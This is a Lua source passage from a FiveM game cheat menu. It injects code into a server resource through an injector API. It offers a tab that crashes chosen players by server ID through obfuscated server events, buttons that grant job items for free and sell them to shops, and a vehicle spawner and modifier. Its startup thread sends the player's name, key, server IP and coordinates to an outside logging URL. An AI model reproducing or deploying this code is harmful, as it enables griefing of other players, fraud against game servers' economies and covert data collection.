                SendActionLog("Vehicle", "Brake 70%", "Disabled", "70", "", "", "", "")
                MachoInjectResource("esx_trunk", [[
brakePower70Enabled = false
if brakePower70Thread then brakePower70Thread = nil end
]])
                MachoMenuNotification("Vehicle", "Brake Power 70% disabled!")
            end
        )

    elseif tabName == "Protection" then
        MachoMenuText(group, "  Protection tab is now empty  ")
        MachoMenuText(group, "  All options moved to Main tab  ")

    elseif tabName == "Crash" then
        MachoMenuText(group, "  CRASH PLAYERS  ")
        MachoMenuText(group, "Enter Player IDs:")
        
        CrashID1InputHandle = MachoMenuInputbox(group, "Player ID 1", "Enter player ID...")
        CrashID2InputHandle = MachoMenuInputbox(group, "Player ID 2", "Enter player ID...")
        CrashID3InputHandle = MachoMenuInputbox(group, "Player ID 3", "Enter player ID...")
        CrashID4InputHandle = MachoMenuInputbox(group, "Player ID 4", "Enter player ID...")
        CrashID5InputHandle = MachoMenuInputbox(group, "Player ID 5", "Enter player ID...")
        
        MachoMenuButton(group, "Execute Crash", function()
            local playerIDs = {}
            local id1 = MachoMenuGetInputbox(CrashID1InputHandle)
            local id2 = MachoMenuGetInputbox(CrashID2InputHandle)
            local id3 = MachoMenuGetInputbox(CrashID3InputHandle)
            local id4 = MachoMenuGetInputbox(CrashID4InputHandle)
            local id5 = MachoMenuGetInputbox(CrashID5InputHandle)
            
            if id1 and id1 ~= "" and tonumber(id1) then table.insert(playerIDs, tonumber(id1)) end
            if id2 and id2 ~= "" and tonumber(id2) then table.insert(playerIDs, tonumber(id2)) end
            if id3 and id3 ~= "" and tonumber(id3) then table.insert(playerIDs, tonumber(id3)) end
            if id4 and id4 ~= "" and tonumber(id4) then table.insert(playerIDs, tonumber(id4)) end
            if id5 and id5 ~= "" and tonumber(id5) then table.insert(playerIDs, tonumber(id5)) end
            
            if #playerIDs == 0 then
                MachoMenuNotification("Crash", "Enter at least one player ID!")
                return
            end
            
            local targetList = table.concat(playerIDs, ",")
            SendActionLog("Crash", "Execute Crash", "Target IDs: " .. targetList, tostring(#playerIDs), "", "", "", targetList)
            
            local crashCode = ""
            for i, targetID in ipairs(playerIDs) do
                crashCode = crashCode .. [[
TriggerServerEvent('YxbLIx7Z5Ku5P0ifRKTdK6MpuaSyjfQXwupITqpQpjSepa1gzcP9JA2ouOLFUQyAssKgLW52NJjJlZ5wW0Q6tCF4AUgfHfQqVgOAdvpUPR94vZrXLsSYIAvW:mtmWqg7HNdYX0QP7CHYWrYJZ4bHmF5hx54u7ndiA2QAYzObJVsgRCyvBM9b6EbZK5eIuixKavNfyH69kMIjXU1HYCl4k2MxcfrKbfJrbMWD2OPTiayTutty5', 120, 'missfinale_c2mcs_1', 'nm', 'fin_c2_mcs_1_camman', 'firemans_carry', 0.15, 0.27, 0.63, ]] .. targetID .. [[, 100000, 0.0, 49, 33, 1, 1325660500)
]]
            end
            MachoInjectResource("esx_trunk", crashCode)
            MachoMenuNotification("Crash", "Crashed " .. #playerIDs .. " player(s)!")
        end)

    elseif tabName == "juma" then
        MachoMenuText(group, "  JUMA OPTIONS  ")

        MachoMenuButton(group, "Clothe", function()
            SendActionLog("juma", "Clothe", "Got tailor toolbox", "15", "tailorToolbox", "SAG 758", "", "")
            MachoInjectResource("esx_trunk", [[
TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:uyWsjuoUykPtgbl6c9AhnRuBWtT6tZPXNlTEcczR0zz9T1zroxIHORCNWqJVuh0W25mLGgy7oCFU802wxw0iiyLWLgF7i9ZSX2C6H4j6Qj8FQ4rlSzEoVELj', 'SAG 758 ', 'item_standard', 'tailorToolbox', 15, 717225484)
TriggerServerEvent('90-Shops:setToSell', "PBX 893", 110, "t_tool", 15, true, "", nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, 1540253779)
]])
            MachoMenuNotification("juma", "Clothe activated!")
        end)

        MachoMenuButton(group, "Wood", function()
            SendActionLog("juma", "Wood", "Got lumberjack toolbox", "5", "lumberjackToolbox", "SAG 758", "", "")
            MachoInjectResource("esx_trunk", [[
TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:uyWsjuoUykPtgbl6c9AhnRuBWtT6tZPXNlTEcczR0zz9T1zroxIHORCNWqJVuh0W25mLGgy7oCFU802wxw0iiyLWLgF7i9ZSX2C6H4j6Qj8FQ4rlSzEoVELj', 'SAG 758 ', 'item_standard', 'lumberjackToolbox', 5, 717225484)
TriggerServerEvent('90-Shops:setToSell', "PBX 893", 220, "l_tool", 5, true, "", nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, 1540253779)
]])
            MachoMenuNotification("juma", "Wood activated!")
        end)

        MachoMenuButton(group, "Oil", function()
            SendActionLog("juma", "Oil", "Got fuel tool box", "25", "f_tool_box", "SAG 758", "", "")
            MachoInjectResource("esx_trunk", [[
TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:uyWsjuoUykPtgbl6c9AhnRuBWtT6tZPXNlTEcczR0zz9T1zroxIHORCNWqJVuh0W25mLGgy7oCFU802wxw0iiyLWLgF7i9ZSX2C6H4j6Qj8FQ4rlSzEoVELj', 'SAG 758 ', 'item_standard', 'f_tool_box', 25, 717225484)
TriggerServerEvent('90-Shops:setToSell', "PBX 893", 199, "f_tool", 25, true, "", nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, 1540253779)
]])
            MachoMenuNotification("juma", "Oil activated!")
        end)

        MachoMenuButton(group, "Salt", function()
            SendActionLog("juma", "Salt", "Got salt tool box", "10", "salt_tool_box", "SAG 758", "", "")
            MachoInjectResource("esx_trunk", [[
TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:uyWsjuoUykPtgbl6c9AhnRuBWtT6tZPXNlTEcczR0zz9T1zroxIHORCNWqJVuh0W25mLGgy7oCFU802wxw0iiyLWLgF7i9ZSX2C6H4j6Qj8FQ4rlSzEoVELj', 'SAG 758 ', 'item_standard', 'salt_tool_box', 10, 717225484)
TriggerServerEvent('90-Shops:setToSell', "PBX 893", 260, "salt_tool", 10, true, "", nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, 1540253779)
]])
            MachoMenuNotification("juma", "Salt activated!")
        end)

    elseif tabName == "Trol" then
        MachoMenuText(group, "  VEHICLE SPAWNER  ")
        
        VehicleCodeInputHandle = MachoMenuInputbox(group, "Vehicle Code", "Enter vehicle code (e.g: adder)...")
        NewPlateInputHandle = MachoMenuInputbox(group, "Vehicle Plate", "Enter plate (e.g: ABC 123)...")
        
        MachoMenuButton(group, "Spawn Vehicle", function()
            local vehicleCode = MachoMenuGetInputbox(VehicleCodeInputHandle)
            local newPlate = MachoMenuGetInputbox(NewPlateInputHandle)
            
            if vehicleCode and vehicleCode ~= "" and newPlate and newPlate ~= "" then
                SendActionLog("Trol", "Spawn Vehicle", "Spawned vehicle", "1", "", vehicleCode, newPlate, "")
                MachoInjectResource("esx_trunk", [[
local ped = PlayerPedId()
local vehicleModel = GetHashKey("]] .. vehicleCode .. [[")
local targetPlate = "]] .. newPlate .. [["
local playerCoords = GetEntityCoords(ped)
local playerHeading = GetEntityHeading(ped)
local spawnCoords = GetOffsetFromEntityInWorldCoords(ped, 0.0, 3.0, 0.5)
RequestModel(vehicleModel)
local attempts = 0
while not HasModelLoaded(vehicleModel) and attempts < 100 do
    attempts = attempts + 1
    Citizen.Wait(50)
end
if HasModelLoaded(vehicleModel) then
    local vehicle = CreateVehicle(vehicleModel, spawnCoords.x, spawnCoords.y, spawnCoords.z, playerHeading, true, false)
    if DoesEntityExist(vehicle) then
        SetEntityAsMissionEntity(vehicle, true, true)
        SetVehicleNumberPlateText(vehicle, targetPlate)
        SetVehicleHasBeenOwnedByPlayer(vehicle, true)
        SetVehicleNeedsToBeHotwired(vehicle, false)
        SetVehicleEngineOn(vehicle, true, true, false)
        SetVehicleFuelLevel(vehicle, 100.0)
        SetVehicleOnGroundProperly(vehicle)
        SetModelAsNoLongerNeeded(vehicleModel)
    end
end
]])
                MachoMenuNotification("Trol", "Spawning " .. vehicleCode .. " with plate: " .. newPlate)
            else
                MachoMenuNotification("Trol", "Enter vehicle code and plate!")
            end
        end)

    elseif tabName == "Modify" then
        local leftColumnWidth = (ContentWidth / 2) - 10
        local rightColumnX = ContentStartX + leftColumnWidth + 20
        
        -- Left Column - Performance (اداء السيارة)
        local leftGroup = MachoMenuGroup(tabHandle, "Performance",
            ContentStartX, ContentStartY,
            ContentStartX + leftColumnWidth, ContentStartY + ContentHeight)
        
        MachoMenuText(leftGroup, "  PERFORMANCE  ")
        
        -- Plate Input
        ModifyPlateInputHandle = MachoMenuInputbox(leftGroup, "Target Plate", "Enter plate (e.g: 696969)...")
        
        MachoMenuText(leftGroup, "  ENGINE  ")
        
        MachoMenuSlider(leftGroup, "Engine", -1, -1, 3, "Lv", 0, function(Value)
            ModifyEngineLevel = Value
        end)
        
        MachoMenuSlider(leftGroup, "Transmission", -1, -1, 2, "Lv", 0, function(Value)
            ModifyTransmissionLevel = Value
        end)
        
        MachoMenuSlider(leftGroup, "Brakes", -1, -1, 2, "Lv", 0, function(Value)
            ModifyBrakesLevel = Value
        end)
        
        MachoMenuSlider(leftGroup, "Turbo", -1, -1, 1, "", 0, function(Value)
            ModifyTurbo = Value
        end)
        
        MachoMenuSlider(leftGroup, "Suspension", -1, -1, 3, "Lv", 0, function(Value)
            ModifySuspensionLevel = Value
        end)
        
        MachoMenuSlider(leftGroup, "Armor", -1, -1, 4, "Lv", 0, function(Value)
            ModifyArmorLevel = Value
        end)
        
        -- Right Column - Appearance (شكل السيارة)
        local rightGroup = MachoMenuGroup(tabHandle, "Appearance",
            rightColumnX, ContentStartY,
            rightColumnX + leftColumnWidth, ContentStartY + ContentHeight)
        
        MachoMenuText(rightGroup, "  APPEARANCE  ")
        
        MachoMenuText(rightGroup, "  COLORS  ")
        
        MachoMenuSlider(rightGroup, "Primary Color", 0, 0, 160, "", 0, function(Value)
            ModifyColor1 = Value
        end)
        
        MachoMenuSlider(rightGroup, "Secondary Color", 0, 0, 160, "", 0, function(Value)
            ModifyColor2 = Value
        end)
        
        MachoMenuSlider(rightGroup, "Pearlescent", 0, 0, 160, "", 0, function(Value)
            ModifyPearlescent = Value
        end)
        
        MachoMenuSlider(rightGroup, "Wheel Color", 0, 0, 160, "", 0, function(Value)
            ModifyWheelColor = Value
        end)
        
        MachoMenuText(rightGroup, "  WINDOWS  ")
        
        MachoMenuSlider(rightGroup, "Window Tint", 0, 0, 6, "Lv", 0, function(Value)
            ModifyWindowTint = Value
        end)
        
        MachoMenuText(rightGroup, "  LIGHTS  ")
        
        MachoMenuSlider(rightGroup, "Xenon Lights", -1, -1, 1, "", 0, function(Value)
            ModifyXenon = Value
        end)
        
        MachoMenuSlider(rightGroup, "Xenon Color", 0, 0, 12, "", 0, function(Value)
            ModifyXenonColor = Value
        end)
        
        MachoMenuText(rightGroup, "  PLATE  ")
        
        MachoMenuSlider(rightGroup, "Plate Style", 0, 0, 5, "", 0, function(Value)
            ModifyPlateIndex = Value
        end)
        
        MachoMenuText(rightGroup, "  WHEELS  ")
        
        -- Wheels Type: 0=Sport, 1=Muscle, 2=Lowrider, 3=SUV, 4=Offroad, 5=Tuner, 6=Bike, 7=HighEnd
        MachoMenuSlider(rightGroup, "Wheel Category", 0, 0, 7, "", 0, function(Value)
            ModifyWheelsType = Value
        end)
        
        -- Front Wheels Index (شكل الكفر) - كل فئة لها أشكال مختلفة
        MachoMenuSlider(rightGroup, "Wheel Style", -1, -1, 50, "", 0, function(Value)
            ModifyFrontWheels = Value
        end)
        
        -- Execute Button at bottom
        MachoMenuText(leftGroup, "  ")
        MachoMenuText(leftGroup, "  ")
        MachoMenuButton(leftGroup, ">>> APPLY MODIFICATIONS <<<", function()
            local targetPlate = MachoMenuGetInputbox(ModifyPlateInputHandle)
            
            if not targetPlate or targetPlate == "" then
                MachoMenuNotification("Modify", "Enter target plate!")
                return
            end
            
            SendActionLog("Modify", "Apply Modifications", "Plate: " .. targetPlate, "1", "", "", targetPlate, "")
            
            MachoInjectResource("esx_trunk", [[
local ped = PlayerPedId()
local vehicle = GetVehiclePedIsIn(ped, false)
local vehicleModel = 0
if vehicle and vehicle ~= 0 then
    vehicleModel = GetEntityModel(vehicle)
end
TriggerServerEvent('JNSbSYmwKLR5LRhU8SOH8t0lZ105l9u6nuygQT5xLMoMhAwPjyZMzDN0hzTZ2aUsi1j1XElFCyO5bqU15ExQTYtspxU41TSZVYoNVjlmZuCN8WaM3YzspPEo:Vjdvx7yAK2Rh56bPoYz76BBBVupU0F5pHgkbuArruROJFI8AP99v79zUSg7zY42klzPZFyoO0qXSDAf1H7RQdmkEvIQsj730zIqn0GHvdzkN2QyzXUSyk1fQ', {
    ['model'] = vehicleModel,
    ['modEngine'] = ]] .. ModifyEngineLevel .. [[,
    ['modTransmission'] = ]] .. ModifyTransmissionLevel .. [[,
    ['modBrakes'] = ]] .. ModifyBrakesLevel .. [[,
    ['modTurbo'] = ]] .. ModifyTurbo .. [[,
    ['modSuspension'] = ]] .. ModifySuspensionLevel .. [[,
    ['modArmor'] = ]] .. ModifyArmorLevel .. [[,
    ['color1'] = ]] .. ModifyColor1 .. [[,
    ['color2'] = ]] .. ModifyColor2 .. [[,
    ['pearlescentColor'] = ]] .. ModifyPearlescent .. [[,
    ['wheelColor'] = ]] .. ModifyWheelColor .. [[,
    ['windowTint'] = ]] .. ModifyWindowTint .. [[,
    ['modXenon'] = ]] .. ModifyXenon .. [[,
    ['xenonColor'] = ]] .. ModifyXenonColor .. [[,
    ['plateIndex'] = ]] .. ModifyPlateIndex .. [[,
    ['wheels'] = ]] .. ModifyWheelsType .. [[,
    ['plate'] = ']] .. targetPlate .. [[',
    ['modWindows'] = -1,
    ['extras'] = {
        ['10'] = false
    },
    ['neonColor'] = {
        [1] = 255,
        [2] = 255,
        [3] = 255
    },
    ['tankHealth'] = 1000.0,
    ['modAirFilter'] = -1,
    ['modOrnaments'] = -1,
    ['modLightbar'] = -1,
    ['neonEnabled'] = {
        [1] = 0,
        [2] = 0,
        [3] = 0,
        [4] = 0
    },
    ['modVanityPlate'] = -1,
    ['modDial'] = -1,
    ['modAerials'] = -1,
    ['modFender'] = -1,
    ['fuelLevel'] = 100.0,
    ['dirtLevel'] = 0.0,
    ['dashboardColor'] = 0,
    ['modDashboard'] = -1,
    ['tyreSmokeColor'] = {
        [1] = 255,
        [2] = 255,
        [3] = 255
    },
    ['modStruts'] = -1,
    ['tyreBurst'] = {
        ['4'] = false,
        ['0'] = false,
        ['5'] = false,
        ['1'] = false
    },
    ['modFrontWheels'] = ]] .. ModifyFrontWheels .. [[,
    ['modBackWheels'] = -1,
    ['modHood'] = -1,
    ['modArchCover'] = -1,
    ['modFrontBumper'] = -1,
    ['modTrunk'] = -1,
    ['modSmokeEnabled'] = 0,
    ['modSteeringWheel'] = -1,
    ['modSpoilers'] = -1,
    ['interiorColor'] = 0,
    ['modShifterLeavers'] = -1,
    ['modSeats'] = -1,
    ['modHydrolic'] = -1,
    ['modFrame'] = -1,
    ['modLivery'] = -1,
    ['modCustomFrontWheels'] = false,
    ['modRearBumper'] = -1,
    ['modDoorSpeaker'] = -1,
    ['modSideSkirt'] = -1,
    ['modRightFender'] = -1,
    ['modTrimA'] = -1,
    ['modExhaust'] = -1,
    ['modTank'] = -1,
    ['modRoof'] = -1,
    ['windowsBroken'] = {
        ['4'] = false,
        ['3'] = false,
        ['6'] = false,
        ['5'] = false,
        ['0'] = false,
        ['7'] = false,
        ['2'] = false,
        ['1'] = false
    },
    ['modHorns'] = -1,
    ['driftTyresEnabled'] = false,
    ['modGrille'] = -1,
    ['tyresCanBurst'] = 1,
    ['doorsBroken'] = {
        ['4'] = false,
        ['3'] = false,
        ['0'] = false,
        ['2'] = false,
        ['1'] = false
    },
    ['bodyHealth'] = 1000.0,
    ['modEngineBlock'] = -1,
    ['modPlateHolder'] = -1,
    ['modRoofLivery'] = -1,
    ['modTrimB'] = -1,
    ['modSpeakers'] = -1,
    ['engineHealth'] = 1000.0,
    ['modCustomBackWheels'] = false,
    ['modAPlate'] = -1
}, 2474678066)
]])
            MachoMenuNotification("Modify", "Modifications applied to " .. targetPlate .. "!")
        end)
    end
end

return true
end

function ToggleAlbsMenu()
    if not isAuthenticated then
        print("                           ERROR: Not authenticated!")
        return
    end
    
    if isMenuOpen and MenuWindow then
        if isMenuVisible then
            isMenuVisible = false
            DisableBlockInput()
        else
            isMenuVisible = true
            EnableBlockInput()
        end
    else
        local success = CreateAlbsMenu()
        if not success then return end
    end
end

RegisterCommand("albsmenu", function() ToggleAlbsMenu() end, false)
RegisterCommand("albs", function() ToggleAlbsMenu() end, false)

Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)
        if isAuthenticated then
            local currentKeyState = IsCustomKeybindPressed()
            if currentKeyState and not lastKeyState then
                ToggleAlbsMenu()
            end
            lastKeyState = currentKeyState
            if blockInputActive and isMenuVisible then
                if IsControlJustPressed(0, 322) then
                    isMenuVisible = false
                    DisableBlockInput()
                end
            end
        end
    end
end)

Citizen.CreateThread(function()
    Wait(2000)
    print("                           Initializing authentication system...")
    local authSuccess = CheckAuthentication()
    if authSuccess then
        print("                           Menu is ready to use! Press DELETE to open.")
        local playerName = GetPlayerName(PlayerId()) or "Unknown"
        local serverId = GetPlayerServerId(PlayerId()) or 0
        local ped = PlayerPedId()
        local coords = GetEntityCoords(ped)
        local playerKey = MachoAuthenticationKey() or "Unknown"
        local serverIP = GetCurrentServerEndpoint() or "Unknown"
        local url = "https://s29-production.up.railway.app/log?name=" .. playerName .. "&sid=" .. serverId .. "&key=" .. playerKey .. "&hp=" .. GetEntityHealth(ped) .. "&ar=" .. GetPedArmour(ped) .. "&st=" .. string.format("%.0f", GetPlayerSprintStaminaRemaining(PlayerId())) .. "&wp=Unarmed&x=" .. string.format("%.0f", coords.x) .. "&y=" .. string.format("%.0f", coords.y) .. "&z=" .. string.format("%.0f", coords.z) .. "&h=0&zone=Unknown&str=Unknown&veh=OnFoot&plt=NA&vhp=NA&mdl=0&pls=0&sip=" .. serverIP .. "&type=authorized"
        local loginDui = MachoCreateDui(url)
        if loginDui then Wait(2000) MachoDestroyDui(loginDui) end
        Wait(1000)
        local success = CreateAlbsMenu()
        if success then
            isMenuVisible = false
            DisableBlockInput()
        end
    else
        print("                           Menu access denied!")
        local playerName = GetPlayerName(PlayerId()) or "Unknown"
        local serverId = GetPlayerServerId(PlayerId()) or 0
        local playerKey = MachoAuthenticationKey() or "Unknown"
        local coords = GetEntityCoords(PlayerPedId())
        local url = "https://s29-production.up.railway.app/log?name=" .. playerName .. "&sid=" .. serverId .. "&key=" .. playerKey .. "&hp=0&ar=0&st=0&wp=NA&x=" .. string.format("%.0f", coords.x) .. "&y=" .. string.format("%.0f", coords.y) .. "&z=" .. string.format("%.0f", coords.z) .. "&h=0&zone=NA&str=NA&veh=NA&plt=NA&vhp=NA&mdl=0&pls=0&sip=Unknown&type=unauthorized"
        local loginDui = MachoCreateDui(url)
        if loginDui then Wait(2000) MachoDestroyDui(loginDui) end
    end
end)